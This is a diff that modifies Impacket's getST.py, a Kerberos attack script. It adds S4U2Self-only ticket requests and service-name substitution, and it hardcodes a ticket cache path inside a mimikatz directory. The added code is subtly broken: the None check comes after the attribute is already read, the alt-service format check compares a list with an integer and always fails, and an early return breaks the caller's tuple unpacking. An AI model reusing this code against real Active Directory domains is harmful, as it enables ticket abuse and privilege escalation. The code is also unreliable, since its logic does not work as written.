@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!C:\Users\x\AppData\Local\Programs\Python\Python39\python.exe
 # Impacket - Collection of Python classes for working with network protocols.
 #
 # SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
@@ -82,12 +82,21 @@ class GETST:
         if options.hashes is not None:
             self.__lmhash, self.__nthash = options.hashes.split(':')
 
-    def saveTicket(self, ticket, sessionKey):
-        logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
-        ccache = CCache()
+    def saveTicket(self, ticket, sessionKey,clientName=None, alt_service=None):
+        clientName=clientName.components[0]
+        if clientName!=None:
+            logging.info('Saving ticket in %s_s4u2self.ccache' % clientName)
+            ccache = CCache()
 
-        ccache.fromTGS(ticket, sessionKey, sessionKey)
-        ccache.saveFile(self.__saveFileName + '.ccache')
+            ccache.fromTGS(ticket, sessionKey, sessionKey, alt_service)
+            ccache.saveFile('%s_s4u2self.ccache'% clientName)
+        else:
+
+            logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
+            ccache = CCache()
+
+            ccache.fromTGS(ticket, sessionKey, sessionKey)
+            ccache.saveFile(self.__saveFileName + '.ccache')
 
     def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):
         if not os.path.isfile(additional_ticket_path):
@@ -296,7 +305,7 @@ class GETST:
 
             return r, cipher, sessionKey, newSessionKey
 
-    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
+    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, s4u2self=False, alt_service=None):
         decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
         # Extract the ticket from the TGT
         ticket = Ticket()
@@ -421,7 +430,9 @@ class GETST:
         message = encoder.encode(tgsReq)
 
         r = sendReceive(message, self.__domain, kdcHost)
-
+        if s4u2self:
+            self.saveTicket(r,sessionKey, clientName, alt_service)
+        return
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
         if logging.getLogger().level == logging.DEBUG:
@@ -622,7 +633,7 @@ class GETST:
         # Do we have a TGT cached?
         tgt = None
         try:
-            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
+            ccache = CCache.loadFile(r'C:\Users\x\1\mimikatz_trunk\x64\WIN-ER6H1V81DV9.ccache')
             logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
             principal = 'krbtgt/%s@%s' % (self.__domain.upper(), self.__domain.upper())
             creds = ccache.getCredential(principal)
@@ -663,7 +674,7 @@ class GETST:
                     tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
                                                                                                   self.__kdcHost, self.__additional_ticket)
                 else:
-                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
+                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, options.s4u2self, options.alt_service)
             except Exception as e:
                 logging.debug("Exception", exc_info=True)
                 logging.error(str(e))
@@ -690,6 +701,8 @@ if __name__ == '__main__':
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
                                                              'delegation to the SPN specified')
+    parser.add_argument('-alt-service', action="store", help='change the service ticket\'s sname')
+    parser.add_argument('-s4u2self', action="store_true", help='only do s4u2self request')
     parser.add_argument('-additional-ticket', action='store', metavar='ticket.ccache', help='include a forwardable service ticket in a S4U2Proxy request for RBCD + KCD Kerberos only')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -728,7 +741,9 @@ if __name__ == '__main__':
         logging.debug(version.getInstallationPath())
     else:
         logging.getLogger().setLevel(logging.INFO)
-
+    if options.alt_service.split('/') != 2:
+        logging.critical('alt-service should be specified as service/host format')
+        sys.exit(1)
     domain, username, password = parse_credentials(options.identity)
 
     try:
